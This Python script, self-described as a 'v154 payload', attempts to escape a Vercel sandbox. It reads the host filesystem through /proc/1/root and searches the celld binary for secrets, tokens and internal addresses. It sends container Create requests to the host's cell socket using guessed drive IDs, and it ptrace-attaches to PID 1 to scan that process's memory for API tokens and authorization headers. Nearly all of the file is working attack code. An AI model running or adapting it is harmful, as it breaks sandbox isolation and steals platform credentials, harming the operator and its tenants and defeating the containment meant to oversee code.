# -*- coding: utf-8 -*-
"""v154 payload: celld-init.sh + celld 二进制 strings + Create(drive_id='sandbox') 实测
输出 /vercel/sandbox/v154c.out"""
import socket, struct, time, json, os, signal, re, ctypes

OUT = '/vercel/sandbox/v154c.out'
f = open(OUT, 'w', encoding='utf-8', errors='replace')
signal.alarm(280)

R = '/proc/1/root'
CELL = R + '/run/cell/cell.sock'
CTRS = '/vercel.hive.cell.api.containers.v1.ContainersService'


def log(s):
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def raw_req(sockpath, path, body, t=4.0, ctype='application/json'):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sockpath)
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: %s\r\n'
               'Connect-Protocol-Version: 1\r\nContent-Length: %d\r\nConnection: close\r\n\r\n'
               % (path, ctype, len(body))).encode() + body
        s.sendall(req)
        d = b''
        try:
            while True:
                c = s.recv(65536)
                if not c:
                    break
                d += c
        except Exception:
            pass
        s.close()
        st = d.split(b'\r\n', 1)[0].decode(errors='replace') if d else 'NO_RESP'
        hdr_end = d.find(b'\r\n\r\n')
        return st, d[hdr_end + 4:hdr_end + 4 + 900] if hdr_end > 0 else b''
    except Exception as e:
        return 'EXC %s' % type(e).__name__, b''


def bin_grep(path, kws, max_size=400 * 1024 * 1024, max_hits=60, ctx=100):
    try:
        size = os.path.getsize(path)
        log('BIN %s size=%d' % (path, size))
        if size > max_size:
            log('BIN skip too big')
            return
        data = open(path, 'rb').read()
        hits = 0
        for kw in kws:
            if hits >= max_hits:
                break
            for m in re.finditer(kw, data):
                s = max(0, m.start() - ctx)
                seg = data[s:m.end() + ctx]
                printable = sum(1 for c in seg if 32 <= c < 127 or c in (9, 10, 13))
                if printable * 10 < len(seg) * 4:
                    continue
                log('BIN %s @0x%x: %r' % (kw, m.start(), seg))
                hits += 1
                if hits >= max_hits:
                    break
        log('BIN %s done hits=%d' % (path, hits))
    except Exception as e:
        log('BIN EXC %s %s' % (path, e))


def mem_scan(pid, kws, tag='', max_bytes=120 * 1024 * 1024, max_found=30, ctx=200):
    try:
        libc = ctypes.CDLL(None, use_errno=True)
        r = libc.ptrace(16, pid, 0, 0)
        log('%s PTRACE_ATTACH rc=%d errno=%d' % (tag, r, ctypes.get_errno()))
        if r != 0:
            return
        try:
            os.waitpid(pid, os.WUNTRACED)
        except Exception:
            pass
        try:
            maps = open('/proc/%d/maps' % pid).read()
        except Exception:
            maps = ''
        targets = []
        for ln in maps.splitlines():
            parts = ln.split()
            if len(parts) < 2:
                continue
            a, b = parts[0].split('-')
            base = int(a, 16)
            size = int(b, 16) - base
            perm = parts[1]
            if perm[0] != 'r' or size < 4096:
                continue
            if base >= 0xc000000000 or (perm[1] == 'w' and size < 200 * 1024 * 1024):
                targets.append((base, size, perm))
        log('%s heap regions=%d' % (tag, len(targets)))
        total = 0
        found = 0
        for base, size, perm in targets:
            if total >= max_bytes or found >= max_found:
                break
            want = min(size, max_bytes - total)
            try:
                mf = open('/proc/%d/mem' % pid, 'rb')
                mf.seek(base)
                chunk = mf.read(want)
                mf.close()
                total += len(chunk)
                for kw in kws:
                    if found >= max_found:
                        break
                    for m in re.finditer(kw, chunk):
                        s = max(0, m.start() - ctx)
                        seg = chunk[s:m.end() + ctx]
                        printable = sum(1 for c in seg if 32 <= c < 127 or c in (9, 10, 13))
                        if printable * 10 < len(seg) * 3:
                            continue
                        log('%s MEM %s @0x%x: %r' % (tag, kw, base + m.start(), seg))
                        found += 1
                        if found >= max_found:
                            break
            except Exception as e:
                log('%s mem EXC %s' % (tag, e))
        log('%s heap scan done bytes=%d found=%d' % (tag, total, found))
        try:
            libc.ptrace(17, pid, 0, 0)
        except Exception:
            pass
    except Exception as e:
        log('%s ptrace EXC %s' % (tag, e))


# ============ 1: celld-init.sh ============
log('=== 1 celld-init.sh ===')
try:
    data = open(R + '/opt/vercel/celld-init.sh', 'rb').read(10000)
    log('INIT len=%d: %r' % (len(data), data))
except Exception as e:
    log('init EXC %s' % e)

# ============ 2: celld 二进制 strings ============
log('=== 2 celld bin ===')
bin_grep(R + '/opt/vercel/celld',
         [rb'drive[_A-Za-z]{0,30}', rb'[Dd]rive[Ii][Dd]', rb'allocate_drive', rb'WaitForDrive',
          rb'retrieveDrive', rb'AcquireDrive', rb'MountDrive', rb'hvd_[A-Za-z0-9_]{4,40}',
          rb'dri_[A-Za-z0-9_]{4,40}', rb'GET [A-Za-z0-9_/.-]{3,60}', rb'POST [A-Za-z0-9_/.-]{3,60}',
          rb'https?://[a-zA-Z0-9_.-]{4,60}', rb'169\.254', rb'10\.0\.0\.[0-9]{1,3}',
          rb'vsock', rb'secret[_A-Za-z]{0,20}', rb'token[_A-Za-z]{0,20}'],
         max_hits=70, ctx=90)

# ============ 3: Create(drive_id='sandbox') ============
log('=== 3 Create drive_id=sandbox ===')
for did in ['sandbox', 'sandbox/', '/sandbox', 'Sandbox', 'default']:
    st, pay = raw_req(CELL, '%s/Create' % CTRS, json.dumps({'drive_id': did}).encode(), t=4)
    log('Create drive_id=%r -> %s %r' % (did, st, pay[:400]))
    if '200' in st and b'error' not in pay.lower() and b'failed' not in pay.lower():
        log('!!! SUCCESS drive_id=%r -> %r' % (did, pay[:900]))

# ============ 4: celld 堆深挖 (日志/配置) ============
log('=== 4 celld deep ===')
try:
    mem_scan(1,
             [rb'"drive_id"', rb'"workload"', rb'"container_id"', rb'4a750ef7',
              rb'celld-init', rb'metadata', rb'169\.254', rb'secret', rb'"token"',
              rb'api[_-]?token', rb'authorization', rb'Authorization'],
             tag='celld', max_bytes=120 * 1024 * 1024, max_found=40, ctx=250)
except Exception as e:
    log('celld deep EXC %s' % e)

log('V154_DONE')
f.close()
